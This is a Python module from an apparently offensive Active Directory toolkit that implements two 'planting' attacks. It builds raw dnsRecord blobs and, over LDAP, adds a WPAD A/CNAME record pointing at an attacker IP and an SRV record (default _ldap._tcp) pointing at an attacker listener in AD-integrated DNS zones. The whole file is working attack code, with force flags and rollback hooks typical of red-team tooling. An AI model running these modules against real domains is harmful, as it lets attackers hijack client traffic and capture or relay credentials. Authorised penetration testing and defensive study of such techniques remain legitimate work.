"""AD-integrated DNS WPAD / SRV planting."""

from __future__ import annotations

import struct
from typing import Any

from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.capabilities.capability_catalog import register_from_catalog
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_ops import finish, register_object_rollback, require_force, require_param
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


def encode_dns_name(name: str) -> bytes:
    out = b""
    for label in name.rstrip(".").split("."):
        encoded = label.encode("ascii")
        out += bytes([len(encoded)]) + encoded
    return out + b"\x00"


def build_a_record(ipv4: str, ttl: int = 60) -> bytes:
    parts = [int(p) for p in ipv4.split(".")]
    if len(parts) != 4:
        raise ValueError(f"Invalid IPv4: {ipv4}")
    data = bytes(parts)
    return (
        struct.pack("<H", 4)
        + struct.pack("<H", 1)
        + bytes([5, 0xF0])
        + struct.pack("<H", 0)
        + struct.pack("<I", 0)
        + struct.pack(">I", ttl)
        + struct.pack("<I", 0)
        + struct.pack("<I", 0)
        + data
    )


def build_cname_record(target: str, ttl: int = 60) -> bytes:
    data = encode_dns_name(target)
    return (
        struct.pack("<H", len(data))
        + struct.pack("<H", 5)
        + bytes([5, 0xF0])
        + struct.pack("<H", 0)
        + struct.pack("<I", 0)
        + struct.pack(">I", ttl)
        + struct.pack("<I", 0)
        + struct.pack("<I", 0)
        + data
    )


def build_srv_record(
    host: str, port: int, ttl: int = 60, priority: int = 0, weight: int = 100
) -> bytes:
    data = struct.pack(">HHH", priority, weight, port) + encode_dns_name(host)
    return (
        struct.pack("<H", len(data))
        + struct.pack("<H", 33)
        + bytes([5, 0xF0])
        + struct.pack("<H", 0)
        + struct.pack("<I", 0)
        + struct.pack(">I", ttl)
        + struct.pack("<I", 0)
        + struct.pack("<I", 0)
        + data
    )


def _dns_zone_dn(conn: Any, base_dn: str, domain: str) -> str:
    candidates = [
        f"DC={domain},CN=MicrosoftDNS,DC=DomainDnsZones,{base_dn}",
        f"DC={domain},CN=MicrosoftDNS,CN=System,{base_dn}",
    ]
    for dn in candidates:
        conn.search(dn, "(objectClass=*)", search_scope=SUBTREE, attributes=["name"], size_limit=1)
        if conn.entries:
            return dn
    return candidates[0]


def _add_dns_node(
    conn: Any, session: Session, zone_dn: str, name: str, record: bytes
) -> dict[str, Any]:
    dn = f"DC={name},{zone_dn}"
    ok = bool(
        conn.add(
            dn,
            attributes={
                "objectClass": ["top", "dnsNode"],
                "dc": name,
                "dnsRecord": record,
            },
        )
    )
    if ok:
        register_object_rollback(session, target_dn=dn, rollback="Delete the planted DNS node.")
    return {"ok": ok, "dn": dn, "name": name, "ldap_result": str(conn.result)}


@register_from_catalog("adidns-wpad")
class AdidnsWpad:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("adidns-wpad", force)
        attacker = require_param(kwargs, "ip", "listener", "value")
        name = str(kwargs.get("name") or "wpad")
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            zone = _dns_zone_dn(conn, base_dn, target.domain)
            record = (
                build_cname_record(str(kwargs["cname"]))
                if kwargs.get("cname")
                else build_a_record(attacker)
            )
            created = _add_dns_node(conn, session, zone, name, record)
            if created["ok"]:
                graph.add_edge(
                    f"DNS@{name.upper()}@{target.domain.upper()}",
                    f"DOMAIN@{target.domain.upper()}",
                    "WpadRecord",
                )
            result = {"ok": created["ok"], "zone": zone, "record": created}
            console.print(f"[green]adidns-wpad[/green] {name} ok={created['ok']}")
            return finish(session, graph, "adidns-wpad", result, ok=created["ok"])
        finally:
            conn.unbind()


@register_from_catalog("dnsadmin-srv")
class DnsAdminSrv:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        require_force("dnsadmin-srv", force)
        host = require_param(kwargs, "host", "listener")
        name = str(kwargs.get("name") or kwargs.get("record") or "_ldap._tcp")
        port = int(kwargs.get("port") or 389)
        conn, base_dn, _cfg = ldap_connect(target)
        try:
            zone = _dns_zone_dn(conn, base_dn, target.domain)
            created = _add_dns_node(conn, session, zone, name, build_srv_record(host, port))
            result = {"ok": created["ok"], "zone": zone, "record": created}
            console.print(f"[green]dnsadmin-srv[/green] {name} ok={created['ok']}")
            return finish(session, graph, "dnsadmin-srv", result, ok=created["ok"])
        finally:
            conn.unbind()
